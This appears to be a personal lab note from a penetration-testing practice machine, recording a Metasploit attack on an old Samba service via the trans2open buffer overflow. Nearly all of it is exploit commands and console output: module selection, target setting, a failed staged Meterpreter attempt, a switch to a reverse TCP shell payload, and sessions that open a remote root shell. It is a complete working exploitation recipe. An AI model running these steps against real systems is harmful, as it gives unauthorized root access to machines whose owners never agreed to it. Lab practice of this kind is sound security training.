metasploit

```
msfconsole
search trans2open
use 1 # the linux one
set rhost 10.148.1.5
exploit
```
The exploit does not take hold and dies

```
msf6 exploit(linux/samba/trans2open) > exploit

[*] Started reverse TCP handler on 10.148.1.4:4444 
[*] 10.148.1.5:139 - Trying return address 0xbffffdfc...
[*] 10.148.1.5:139 - Trying return address 0xbffffcfc...
[*] 10.148.1.5:139 - Trying return address 0xbffffbfc...
[*] 10.148.1.5:139 - Trying return address 0xbffffafc...
[*] Sending stage (984904 bytes) to 10.148.1.5
[*] 10.148.1.5 - Meterpreter session 1 closed.  Reason: Died
[*] 10.148.1.5:139 - Trying return address 0xbffff9fc...
[*] Sending stage (984904 bytes) to 10.148.1.5
[*] 10.148.1.5 - Meterpreter session 2 closed.  Reason: Died
[*] 10.148.1.5:139 - Trying return address 0xbffff8fc...
[*] Sending stage (984904 bytes) to 10.148.1.5
[*] 10.148.1.5 - Meterpreter session 3 closed.  Reason: Died
[*] 10.148.1.5:139 - Trying return address 0xbffff7fc...
[*] Sending stage (984904 bytes) to 10.148.1.5
[*] 10.148.1.5 - Meterpreter session 4 closed.  Reason: Died
```

Above is a staged payload, this does not seem to be working, swaping to non-staged for better results

```
set payload linux/x86/shell_reverse_tcp
```
my options
```
msf6 exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.148.1.5       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  10.148.1.4       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce

```
**SUCCESS**
```
msf6 exploit(linux/samba/trans2open) > exploit

[*] Started reverse TCP handler on 10.148.1.4:4444 
[*] 10.148.1.5:139 - Trying return address 0xbffffdfc...
[*] 10.148.1.5:139 - Trying return address 0xbffffcfc...
[*] 10.148.1.5:139 - Trying return address 0xbffffbfc...
[*] 10.148.1.5:139 - Trying return address 0xbffffafc...
[*] 10.148.1.5:139 - Trying return address 0xbffff9fc...
[*] 10.148.1.5:139 - Trying return address 0xbffff8fc...
[*] Command shell session 5 opened (10.148.1.4:4444 -> 10.148.1.5:32773) at 2021-06-24 21:46:35 -0400

[*] Command shell session 6 opened (10.148.1.4:4444 -> 10.148.1.5:32774) at 2021-06-24 21:46:36 -0400
[*] Command shell session 7 opened (10.148.1.4:4444 -> 10.148.1.5:32775) at 2021-06-24 21:46:37 -0400
whoami
root
pwd
/tmp

```